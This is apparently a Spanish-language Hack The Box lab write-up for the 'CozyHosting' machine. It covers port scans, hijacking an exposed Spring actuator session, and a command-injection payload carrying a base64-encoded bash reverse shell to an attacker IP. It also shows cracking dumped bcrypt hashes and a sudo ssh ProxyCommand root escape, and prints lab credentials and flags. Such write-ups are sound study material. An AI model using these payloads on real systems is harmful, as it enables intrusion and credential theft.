![CozyHosting](https://github.com/n0m3l4c000nt35/Hack-The-Box/assets/149972189/5f17f515-3027-47c3-a2f1-441439e5f3e1)

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.230 -oG allPorts`

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-09 20:01 -03
Initiating SYN Stealth Scan at 20:01
Scanning 10.10.11.230 [65535 ports]
Discovered open port 80/tcp on 10.10.11.230
Discovered open port 8888/tcp on 10.10.11.230
Discovered open port 22/tcp on 10.10.11.230
Discovered open port 8000/tcp on 10.10.11.230
Completed SYN Stealth Scan at 20:01, 14.69s elapsed (65535 total ports)
Nmap scan report for 10.10.11.230
Host is up, received user-set (0.16s latency).
Scanned at 2023-12-09 20:01:42 -03 for 15s
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 63
80/tcp   open  http           syn-ack ttl 63
8000/tcp open  http-alt       syn-ack ttl 63
8888/tcp open  sun-answerbook syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.82 seconds
           Raw packets sent: 71989 (3.168MB) | Rcvd: 71791 (2.872MB)
```

<br>

```bash
nvim /etc/hosts
cozyhosting.htb
```

<br>

[http://cozyhosting.htb/](http://cozyhosting.htb/)

<br>

`nmap -p 22,80,8000,8888 -n -Pn -sCV --min-rate 5000 10.10.11.230 -oN targeted`

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-09 20:10 -03
Nmap scan report for 10.10.11.230
Host is up (0.16s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
|_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
8000/tcp open  http            SimpleHTTPServer 0.6 (Python 3.10.12)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.10.12
8888/tcp open  sun-answerbook?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.85 seconds
```

<br>

`gobuster dir -u http://cozyhosting.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20`

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/12/09 20:33:40 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431] 
/admin                (Status: 401) [Size: 97]   
/logout               (Status: 204) [Size: 0]    
/error                (Status: 500) [Size: 73]   
/http%3A%2F%2Fwww     (Status: 400) [Size: 435]  
/http%3A%2F%2Fyoutube (Status: 400) [Size: 435]  
/%C0                  (Status: 400) [Size: 435]  
Progress: 66949 / 220561 (30.35%)               ^C
[!] Keyboard interrupt detected, terminating.
                                                 
===============================================================
2023/12/09 20:42:46 Finished
===============================================================
```

<br>

`dirsearch -u http://cozyhosting.htb`

```bash
  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/cozyhosting.htb/_23-12-09_21-29-22.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-12-09_21-29-22.log

Target: http://cozyhosting.htb/

[21:29:23] Starting: 
[21:29:35] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
[21:29:39] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[21:29:40] 400 -  435B  - /a%5c.aspx
[21:29:41] 200 -  634B  - /actuator
[21:29:41] 200 -    5KB - /actuator/env
[21:29:41] 200 -   15B  - /actuator/health
[21:29:41] 200 -   10KB - /actuator/mappings
[21:29:42] 200 -   98B  - /actuator/sessions
[21:29:42] 200 -  124KB - /actuator/beans
[21:29:42] 401 -   97B  - /admin
[21:30:01] 200 -    0B  - /engine/classes/swfupload//swfupload.swf
[21:30:01] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf
[21:30:01] 500 -   73B  - /error
[21:30:02] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[21:30:02] 200 -    0B  - /extjs/resources//charts.swf
[21:30:05] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf
[21:30:06] 200 -   12KB - /index
[21:30:08] 200 -    4KB - /login
[21:30:08] 200 -    0B  - /login.wdm%2e
[21:30:09] 204 -    0B  - /logout
[21:30:19] 400 -  435B  - /servlet/%C0%AE%C0%AE%C0%AF

Task Completed
<dirsearch.dirsearch.Program object at 0x7f4c978d4b80>
```

<br>

[http://cozyhosting.htb/actuator/sessions](http://cozyhosting.htb/actuator/sessions)

```bash
AB7F8F8A0FC69FF5B97CB969B3A1298F	"UNAUTHORIZED"
251BBD1B1E1BBFFA5A4AA34F8DB4EC12	"UNAUTHORIZED"
65863FCFFD32AA46AE8234FCB285B739	"UNAUTHORIZED"
F99CF05847D0C79B554F3C58AAFC0D7A	"kanderson"
```

<br>

`JSESSIONID:"F99CF05847D0C79B554F3C58AAFC0D7A"`

[http://cozyhosting.htb/admin](http://cozyhosting.htb/admin)

<br>

```bash
echo "bash -i >& /dev/tcp/<ip-atacante>/<puerto> 0>&1" | base64
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNDYvNzc3NyAwPiYxCg==" | base64 -d | bash
;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNDYvNDE0MiAwPiYxCg=="|base64${IFS}-d|bash;
%3becho${IFS}"YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yNDYvNDE0MiAwPiYxCg%3d%3d"|base64${IFS}-d|bash%3b
```

<br>

Tratamiento de la TTY
```bash
script /dev/null -c bash
ctrl + z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
```

<br>

```bash
cd /app
ls -l
cloudhosting-0.0.1.jar

python3 -m http.server 80
```

```bash
wget http://<ip-victima>/<port>/cloudhosting-0.0.1.jar
```

<br>

[https://java-decompiler.github.io/](https://java-decompiler.github.io/)

`java -jar jd-gui-1.6.6.jar`

application.properties

```java
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

scheduled/FakeUser.class
```java
username -> kanderson
password -> MRdEQuv6~6P9
```

<br>

`psql "postgresql://postgres:Vg&nvzAQ7XxR@127.0.0.1:5432/cozyhosting"`

```bash
\l
\c cozyhosting
\dt
\d users
SELECT * FROM users;

   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

<br>

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt admin

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)
1g 0:00:00:12 DONE (2023-12-13 09:22) 0.07710g/s 216.4p/s 216.4c/s 216.4C/s hellomoto..keyboard
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

<br>

```bash
su josh
manchesterunited
```

```bash
cd /home/jose
cat user.txt
```

> [!IMPORTANT]
> User flag: c07db06d197bee1a21bfdad6494b6519

<br>

```bash
sudo -l
manchesterunited

Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

[https://gtfobins.github.io/gtfobins/ssh/#sudo](https://gtfobins.github.io/gtfobins/ssh/#sudo)

`sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`

```bash
cd /root
cat root.txt
```

> [!IMPORTANT]
> Root flag: 6b8ccb9c26ebf11122a9e82977301258

